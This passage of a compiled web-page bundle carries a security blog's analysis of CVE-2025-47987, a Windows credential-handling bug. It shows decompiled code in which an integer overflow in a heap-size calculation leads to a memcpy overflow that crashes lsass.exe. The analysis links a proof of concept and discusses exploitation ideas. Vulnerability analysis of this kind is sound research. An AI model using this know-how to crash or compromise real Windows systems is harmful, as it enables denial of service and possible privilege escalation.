#F8F8F2"> password-&gt;Length </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> username-&gt;Length </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">93</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">&</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">FFFFFFF8</span><span style="color: #F8F8F2">;</span></div><div class='line highlight'><span style="color: #F8F8F2">    __totalLength </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> totalLength </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> certLen;</span></div><div class='line dim'><span style="color: #F8F8F2">    _Size </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> certLen;</span></div><div class='line'></div><div class='line highlight'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Allocate memory</span></div><div class='line highlight'><span style="color: #F8F8F2">    vulnBuf </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSAllocate</span><span style="color: #F8F8F2">(__totalLength);</span></div><div class='line dim'><span style="color: #F8F8F2">    _vulnBuf </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> vulnBuf;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (</span><span style="color: #F92672">!</span><span style="color: #F8F8F2">vulnBuf)</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">C000009A</span><span style="color: #F8F8F2">;   </span><span style="color: #88846F">// STATUS_INSUFFICIENT_RESOURCES</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Fill in header</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(DWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)vulnBuf </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">13</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">    currentPtr   </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">80</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">    passwordBuf  </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">void</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">80</span><span style="color: #F8F8F2">);</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Password</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(WORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">40</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> password-&gt;Length;</span></div><div class='line dim'><span style="color: #F8F8F2">    length </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> password-&gt;Length;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(QWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">48</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">80</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(WORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">42</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> length </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #A6E22E">memcpy_0</span><span style="color: #F8F8F2">(passwordBuf, password-&gt;Buffer, password-&gt;Length);</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Domain</span></div><div class='line dim'><span style="color: #F8F8F2">    domainBuf </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(</span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">short</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">42</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> currentPtr);</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(WORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">8</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> domain-&gt;Length;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(WORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> domain-&gt;Length </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(QWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">16</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">domainBuf[</span><span style="color: #F92672">-</span><span style="color: #F8F8F2">_vulnBuf];</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #A6E22E">memcpy_0</span><span style="color: #F8F8F2">(domainBuf, domain-&gt;Buffer, domain-&gt;Length);</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Username</span></div><div class='line dim'><span style="color: #F8F8F2">    usernameBuf </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">domainBuf[</span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">short</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span><span style="color: #F8F8F2">)];</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(WORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">24</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> username-&gt;Length;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(WORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">26</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> username-&gt;Length </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(QWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">32</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">usernameBuf[</span><span style="color: #F92672">-</span><span style="color: #F8F8F2">_vulnBuf];</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #A6E22E">memcpy_0</span><span style="color: #F8F8F2">(usernameBuf, username-&gt;Buffer, username-&gt;Length);</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Certificate</span></div><div class='line dim'><span style="color: #F8F8F2">    certBuf </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(</span></div><div class='line dim'><span style="color: #F8F8F2">        (</span><span style="color: #66D9EF">uint64_t</span><span style="color: #F8F8F2">)</span><span style="color: #F92672">&</span><span style="color: #F8F8F2">usernameBuf[</span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">short</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">26</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">7</span><span style="color: #F8F8F2">]</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #F92672">&</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">FFFFFFFFFFFFFFF8</span><span style="color: #F92672">ULL</span></div><div class='line dim'><span style="color: #F8F8F2">    );</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(DWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">60</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> _Size;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(QWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_vulnBuf </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">64</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">certBuf[</span><span style="color: #F92672">-</span><span style="color: #F8F8F2">_vulnBuf];</span></div><div class='line highlight'><span style="color: #F8F8F2">    </span><span style="color: #A6E22E">memcpy_0</span><span style="color: #F8F8F2">(certBuf, certData, _Size); </span><span style="color: #88846F">// Overflow occurs here</span></div><div class='line dim'><span style="color: #F8F8F2">    ...</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> status;</span></div><div class='line dim'><span style="color: #F8F8F2">&#125;</span></div></code></div></pre>`,kl,vl,Bn="The heap object size is calculated as the sum of the lengths of the <strong>username</strong>, <strong>domain</strong>, <strong>password</strong>, and <strong>certificate</strong>, plus a fixed overhead of <strong>93 bytes</strong>. Because the certificate length can be any 32-bit (DWORD) value, the total size calculation can overflow.",dn,ul,In="The resulting incorrect size is then used to allocate a heap object. When the code later copies the certificate bytes into this undersized buffer, an overflow occurs—approximately 4 GB of data is written past the end of the allocated chunk.",Vn,Cn,vn,jn,un,de="This overwrites adjacent heap structures and accesses unmapped memory, leading to a crash of the privileged <code>lsass.exe</code> process.",zn,fn,ve='<a href="https://github.com/Kryptoenix/CVE-2025-47987_PoC/" rel="nofollow noopener noreferrer external" target="_blank">PoC code here (Win11 23H2)</a>',Gn,gl,ue,qn,Sl,fe='<a href="#exploitation-ideas">Exploitation Ideas</a>',Kn,hn,he="Even though Microsoft classifies this CVE with an exploitability assessment of <strong><em>“Exploitation More Likely”</em></strong>, the crash caused by the overflow appears difficult to avoid because of the large number of bytes involved. It is theoretically possible that pointers could be overwritten before integrity checks are triggered, which might open a path to code execution that causes persistence across the forced reboot. However, modern security mitigations significantly reduce the likelihood of such a scenario. Therefore, the exploitation stage requires a better expertise in:",Qn,mn,me="<li><p>Windows heap internals</p> <ul><li>LFH, safe unlinking &amp; pointer decoding, guard pages, delayed free</li></ul></li> <li><p>Mitigations in user-mode on Windows 11</p> <ul><li>Heap isolation, pointer encoding, CFG, CET, MemGC</li></ul></li>",Yn,xl,ge='<a href="#conclusion">Conclusion</a>',Zn,gn,_e="This concludes my analysis. Each piece of the puzzle has helped build a clearer picture of the vulnerability.  Hopefully, this sparks someone’s curiosity to dig deeper and perhaps even solve the exploitation mystery by crafting a working LPE proof-of-concept:). Either way, remember to stay curious and vigilant. Until next time — crash <code>lsass.exe</code>!",Xn,Ml,Ee='<a href="#references">References</a>',Jn,_n,be='<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47987" rel="nofollow noopener noreferrer external" target="_blank">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47987</a>',se,En,we='<a href="https://ldapwiki.com/wiki/Wiki.jsp?page=Windows%20Client%20Authentication%20Architecture" rel="nofollow noopener noreferrer external" target="_blank">https://ldapwiki.com/wiki/Wiki.jsp?page=Windows%20Client%20Authentication%20Architecture</a>',le,bn,De='<a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle--general" rel="nofollow noopener noreferrer external" target="_blank">https://learn.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle–general</a>',ne;return T=new Qe({props:{$$slots:{default:[Ha]},$$scope:{ctx:i}}}),w=new Gs({props:{src:"/demystifying-CVE-2025-47987/authn_lsa_architecture_client.png"}}),_=new Gs({props:{src:"/demystifying-CVE-2025-47987/credssp_rdp.png"}}),Es=new $a({props:{style:"font-size: 20px;",status:"info",description:"Usually, a faster route to identify the vulnerable driver is by extracting the drivers associated with the patch update (KB number), but recently, Microsoft changed the update file format and the extraction of its associated system files became harder.",title:"Tip"}}),vn=new Gs({props:{src:"/demystifying-CVE-2025-47987/overflow.png"}}),{c(){s=d("p"),s.textContent=e,a=f(),l=d("h2"),l.innerHTML=t,p=f(),h=d("p"),h.textContent=v,b=f(),U(T.$$.fragment),R=f(),C=d("p"),U(w.$$.fragment),k=f(),D=d("p"),D.innerHTML=x,P=f(),A=d("p"),U(_.$$.fragment),H=f(),j=d("h2"),j.innerHTML=O,S=f(),I=d("p"),I.innerHTML=as,Ks=f(),J=d("ul"),J.innerHTML=ms,gs=f(),_s=d("p"),_s.innerHTML=Qs,Bl=f(),U(Es.$$.fragment),Ys=f(),fl=d("p"),fl.textContent=El,bs=f(),bl=new Q(!1),es=f(),Zs=d("p"),Zs.innerHTML=Il,ws=f(),Bs=d("h2"),Bs.innerHTML=Pl,Xs=f(),hl=d("p"),hl.innerHTML=wl,Ds=f(),Js=d("ul"),Js.innerHTML=Rl,Is=f(),ss=d("p"),ss.innerHTML=Ol,Ls=f(),Dl=new Q(!1),os=f(),sl=d("p"),sl.innerHTML=Nl,ts=f(),Ll=new Q(!1),ps=f(),Ps=d("h3"),Ps.innerHTML=Ul,Y=f(),ll=d("p"),ll.innerHTML=Wl,Ts=f(),Tl=new Q(!1),Fs=f(),nl=d("p"),nl.innerHTML=Vl,Rs=f(),ls=d("ul"),ls.innerHTML=jl,As=f(),el=d("p"),el.innerHTML=zl,Os=f(),Z=d("h4"),Z.innerHTML=Gl,Cs=f(),al=d("p"),al.innerHTML=ql,ol=f(),Kl=new Q(!1),rs=f(),tl=d("p"),tl.innerHTML=Yl,Ns=f(),q=d("img"),is=f(),Us=d("h3"),Us.innerHTML=Xl,ks=f(),pl=d("p"),pl.innerHTML=Jl,Fl=f(),sn=new Q(!1),cs=f(),rl=d("p"),rl.innerHTML=nn,Ws=f(),X=d("h4"),X.innerHTML=en,Vs=f(),ns=d("p"),ns.innerHTML=an,Ss=f(),Al=new Q(!1),js=f(),ml=d("p"),ml.innerHTML=Cl,xs=f(),il=d("ul"),il.innerHTML=on,cl=f(),tn=new Q(!1),ys=f(),yl=d("p"),yl.innerHTML=Fn,ds=f(),vs=d("img"),Ms=f(),zs=d("h3"),zs.innerHTML=cn,$s=f(),dl=d("p"),dl.innerHTML=yn,r=f(),g=new Q(!1),kl=f(),vl=d("p"),vl.innerHTML=Bn,dn=f(),ul=d("p"),ul.textContent=In,Vn=f(),Cn=d("p"),U(vn.$$.fragment),jn=f(),un=d("p"),un.innerHTML=de,zn=f(),fn=d("p"),fn.innerHTML=ve,Gn=f(),gl=d("video"),qn=f(),Sl=d("h2"),Sl.innerHTML=fe,Kn=f(),hn=d("p"),hn.innerHTML=he,Qn=f(),mn=d("ul"),mn.innerHTML=me,Yn=f(),xl=d("h2"),xl.innerHTML=ge,Zn=f(),gn=d("p"),gn.innerHTML=_e,Xn=f(),Ml=d("h2"),Ml.innerHTML=Ee,Jn=f(),_n=d("p"),_n.innerHTML=be,se=f(),En=d("p"),En.innerHTML=we,le=f(),bn=d("p"),bn.innerHTML=De,this.h()},l(o){s=y(o,"P",{"data-svelte-h":!0}),E(s)!=="svelte-1cf6xwb"&&(s.textContent=e),a=u(o),l=y(o,"H2",{id:!0,"data-svelte-h":!0}),E(l)!=="svelte-daz9pc"&&(l.innerHTML=t),p=u(o),h=y(o,"P",{"data-svelte-h":!0}),E(h)!=="svelte-1ivkzmk"&&(h.textContent=v),b=u(o),V(T.$$.fragment,o),R=u(o),C=y(o,"P",{});var c=L(C);V(w.$$.fragment,c),c.forEach(n),k=u(o),D=y(o,"P",{"data-svelte-h":!0}),E(D)!=="svelte-7tfvlj"&&(D.innerHTML=x),P=u(o),A=y(o,"P",{});var Pn=L(A);V(_.$$.fragment,Pn),Pn.forEach(n),H=u(o),j=y(o,"H2",{id:!0,"data-svelte-h":!0}),E(j)!=="svelte-c8o2ov"&&(j.innerHTML=O),S=u(o),I=y(o,"P",{"data-svelte-h":!0}),E(I)!=="svelte-17i75gr"&&(I.innerHTML=as),Ks=u(o),J=y(o,"UL",{"data-svelte-h":!0}),E(J)!=="svelte-vkq1gg"&&(J.innerHTML=ms),gs=u(o),_s=y(o,"P",{"data-svelte-h":!0}),E(_s)!=="svelte-90nf04"&&(_s.innerHTML=Qs),Bl=u(o),V(Es.$$.fragment,o),Ys=u(o),fl=y(o,"P",{"data-svelte-h":!0}),E(fl)!=="svelte-1lvm5qv"&&(fl.textContent=El),bs=u(o),bl=K(o,!1),es=u(o),Zs=y(o,"P",{"data-svelte-h":!0}),E(Zs)!=="svelte-qoeirs"&&(Zs.innerHTML=Il),ws=u(o),Bs=y(o,"H2",{id:!0,"data-svelte-h":!0}),E(Bs)!=="svelte-1y92owq"&&(Bs.innerHTML=Pl),Xs=u(o),hl=y(o,"P",{"data-svelte-h":!0}),E(hl)!=="svelte-akc3jh"&&(hl.innerHTML=wl),Ds=u(o),Js=y(o,"UL",{"data-svelte-h":!0}),E(Js)!=="svelte-1rmq3os"&&(Js.innerHTML=Rl),Is=u(o),ss=y(o,"P",{"data-svelte-h":!0}),E(ss)!=="svelte-1sg7tlg"&&(ss.innerHTML=Ol),Ls=u(o),Dl=K(o,!1),os=u(o),sl=y(o,"P",{"data-svelte-h":!0}),E(sl)!=="svelte-nfgyqs"&&(sl.innerHTML=Nl),ts=u(o),Ll=K(o,!1),ps=u(o),Ps=y(o,"H3",{id:!0,"data-svelte-h":!0}),E(Ps)!=="svelte-16zgcb2"&&(Ps.innerHTML=Ul),Y=u(o),ll=y(o,"P",{"data-svelte-h":!0}),E(ll)!=="svelte-1mrsvoo"&&(ll.innerHTML=Wl),Ts=u(o),Tl=K(o,!1),Fs=u(o),nl=y(o,"P",{"data-svelte-h":!0}),E(nl)!=="svelte-1o125ol"&&(nl.innerHTML=Vl),Rs=u(o),ls=y(o,"UL",{"data-svelte-h":!0}),E(ls)!=="svelte-1vjqtxi"&&(ls.innerHTML=jl),As=u(o),el=y(o,"P",{"data-svelte-h":!0}),E(el)!=="svelte-1lsc69s"&&(el.innerHTML=zl),Os=u(o),Z=y(o,"H4",{id:!0,"data-svelte-h":!0}),E(Z)!=="svelte-12vgnw6"&&(Z.innerHTML=Gl),Cs=u(o),al=y(o,"P",{"data-svelte-h":!0}),E(al)!=="svelte-si9xav"&&(al.innerHTML=ql),ol=u(o),Kl=K(o,!1),rs=u(o),tl=y(o,"P",{"data-svelte-h":!0}),E(tl)!=="svelte-1rg88rb"&&(tl.innerHTML=Yl),Ns=u(o),q=y(o,"IMG",{src:!0,width:!0,style:!0}),is=u(o),Us=y(o,"H3",{id:!0,"data-svelte-h":!0}),E(Us)!=="svelte-15pdpew"&&(Us.innerHTML=Xl),ks=u(o),pl=y(o,"P",{"data-svelte-h":!0}),E(pl)!=="svelte-bpct6a"&&(pl.innerHTML=Jl),Fl=u(o),sn=K(o,!1),cs=u(o),rl=y(o,"P",{"data-svelte-h":!0}),E(rl)!=="svelte-1ey2e5d"&&(rl.innerHTML=nn),Ws=u(o),X=y(o,"H4",{id:!0,"data-svelte-h":!0}),E(X)!=="svelte-stf7wl"&&(X.innerHTML=en),Vs=u(o),ns=y(o,"P",{"data-svelte-h":!0}),E(ns)!=="svelte-1m0i1ox"&&(ns.innerHTML=an),Ss=u(o),Al=K(o,!1),js=u(o),ml=y(o,"P",{"data-svelte-h":!0}),E(ml)!=="svelte-fcmeo0"&&(ml.innerHTML=Cl),xs=u(o),il=y(o,"UL",{"data-svelte-h":!0}),E(il)!=="svelte-oa9hdf"&&(il.innerHTML=on),cl=u(o),tn=K(o,!1),ys=u(o),yl=y(o,"P",{"data-svelte-h":!0}),E(yl)!=="svelte-1bm945n"&&(yl.innerHTML=Fn),ds=u(o),vs=y(o,"IMG",{src:!0,width:!0,style:!0}),Ms=u(o),zs=y(o,"H3",{id:!0,"data-svelte-h":!0}),E(zs)!=="svelte-1iqvjrz"&&(zs.innerHTML=cn),$s=u(o),dl=y(o,"P",{"data-svelte-h":!0}),E(dl)!=="svelte-1qfc8q4"&&(dl.innerHTML=yn),r=u(o),g=K(o,!1),kl=u(o),vl=y(o,"P",{"data-svelte-h":!0}),E(vl)!=="svelte-1mkmhk2"&&(vl.innerHTML=Bn),dn=u(o),ul=y(o,"P",{"data-svelte-h":!0}),E(ul)!=="svelte-180vc6l"&&(ul.textContent=In),Vn=u(o),Cn=y(o,"P",{});var Le=L(Cn);V(vn.$$.fragment,Le),Le.forEach(n),jn=u(o),un=y(o,"P",{"data-svelte-h":!0}),E(un)!=="svelte-svfwjm"&&(un.innerHTML=de),zn=u(o),fn=y(o,"P",{"data-svelte-h":!0}),E(fn)!=="svelte-174s55s"&&(fn.innerHTML=ve),Gn=u(o),gl=y(o,"VIDEO",{src:!0,title:!0}),L(gl).forEach(n),qn=u(o),Sl=y(o,"H2",{id:!0,"data-svelte-h":!0}),E(Sl)!=="svelte-1cilq0w"&&(Sl.innerHTML=fe),Kn=u(o),hn=y(o,"P",{"data-svelte-h":!0}),E(hn)!=="svelte-18f0y70"&&(hn.innerHTML=he),Qn=u(o),mn=y(o,"UL",{"data-svelte-h":!0}),E(mn)!=="svelte-1e9bq3x"&&(mn.innerHTML=me),Yn=u(o),xl=y(o,"H2",{id:!0,"data-svelte-h":!0}),E(xl)!=="svelte-kmpttn"&&(xl.innerHTML=ge),Zn=u(o),gn=y(o,"P",{"data-svelte-h":!0}),E(gn)!=="svelte-f4flx5"&&(gn.innerHTML=_e),Xn=u(o),Ml=y(o,"H2",{id:!0,"data-svelte-h":!0}),E(Ml)!=="svelte-m6t0hm"&&(Ml.innerHTML=Ee),Jn=u(o),_n=y(o,"P",{"data-svelte-h":!0}),E(_n)!=="svelte-wlk0jn"&&(_n.innerHTML=be),se=u(o),En=y(o,"P",{"data-svelte-h":!0}),E(En)!=="svelte-1ap8ze5"&&(En.innerHTML=we),le=u(o),bn=y(o,"P",{"data-svelte-h":!0}),E(bn)!=="svelte-1a6gw2a"&&(bn.innerHTML=De),this.h()},h(){m(l,"id","client-authentication-architecture"),m(j,"id","root-cause"),bl.a=es,m(Bs,"id","building-a-poc-crash"),Dl.a=os,Ll.a=ps,m(Ps,"id","reaching-tsinitcertcreds"),Tl.a=Fs,m(Z,"id","crafting-a-valid-packed-kerbcertlogonbuffer"),Kl.a=rs,kn(q.src,Zl="buffer_format.png")||m(q,"src",Zl),m(q,"width","500"),qs(q,"display","block"),qs(q,"margin-left","auto"),qs(q,"margin-right","auto"),m(Us,"id","reaching-the-vulnerable-function"),sn.a=cs,m(X,"id","crafting-a-valid-csp-buffer"),Al.a=js,tn.a=ys,kn(vs.src,rn="buffer_format_csp.png")||m(vs,"src",rn),m(vs,"width","200"),qs(vs,"display","block"),qs(vs,"margin-left","auto"),qs(vs,"margin-right","auto"),m(zs,"id","triggering-the-bug"),g.a=kl,gl.controls=!0,kn(gl.src,ue="poc.mp4")||m(gl,"src",ue),m(gl,"title","Title"),m(Sl,"id","exploitation-ideas"),m(xl,"id","conclusion"),m(Ml,"id","references")},m(o,c){F(o,s,c),F(o,a,c),F(o,l,c),F(o,p,c),F(o,h,c),F(o,b,c),W(T,o,c),F(o,R,c),F(o,C,c),W(w,C,null),F(o,k,c),F(o,D,c),F(o,P,c),F(o,A,c),W(_,A,null),F(o,H,c),F(o,j,c),F(o,S,c),F(o,I,c),F(o,Ks,c),F(o,J,c),F(o,gs,c),F(o,_s,c),F(o,Bl,c),W(Es,o,c),F(o,Ys,c),F(o,fl,c),F(o,bs,c),bl.m(wn,o,c),F(o,es,c),F(o,Zs,c),F(o,ws,c),F(o,Bs,c),F(o,Xs,c),F(o,hl,c),F(o,Ds,c),F(o,Js,c),F(o,Is,c),F(o,ss,c),F(o,Ls,c),Dl.m(Dn,o,c),F(o,os,c),F(o,sl,c),F(o,ts,c),Ll.m(Ln,o,c),F(o,ps,c),F(o,Ps,c),F(o,Y,c),F(o,ll,c),F(o,Ts,c),Tl.m(Tn,o,c),F(o,Fs,c),F(o,nl,c),F(o,Rs,c),F(o,ls,c),F(o,As,c),F(o,el,c),F(o,Os,c),F(o,Z,c),F(o,Cs,c),F(o,al,c),F(o,ol,c),Kl.m(Ql,o,c),F(o,rs,c),F(o,tl,c),F(o,Ns,c),F(o,q,c),F(o,is,c),F(o,Us,c),F(o,ks,c),F(o,pl,c),F(o,Fl,c),sn.m(ln,o,c),F(o,cs,c),F(o,rl,c),F(o,Ws,c),F(o,X,c),F(o,Vs,c),F(o,ns,c),F(o,Ss,c),Al.m(An,o,c),F(o,js,c),F(o,ml,c),F(o,xs,c),F(o,il,c),F(o,cl,c),tn.m(pn,o,c),F(o,ys,c),F(o,yl,c),F(o,ds,c),F(o,vs,c),F(o,Ms,c),F(o,zs,c),F(o,$s,c),F(o,dl,c),F(o,r,c),g.m(Wn,o,c),F(o,kl,c),F(o,vl,c),F(o,dn,c),F(o,ul,c),F(o,Vn,c),F(o,Cn,c),W(vn,Cn,null),F(o,jn,c),F(o,un,c),F(o,zn,c),F(o,fn,c),F(o,Gn,c),F(o,gl,c),F(o,qn,c),F(o,Sl,c),F(o,Kn,c),F(o,hn,c),F(o,Qn,c),F(o,mn,c),F(o,Yn,c),F(o,xl,c),F(o,Zn,c),F(o,gn,c),F(o,Xn,c),F(o,Ml,c),F(o,Jn,c),F(o,_n,c),F(o,se,c),F(o,En,c),F(o,le,c),F(o,bn,c),ne=!0},p(o,c){const 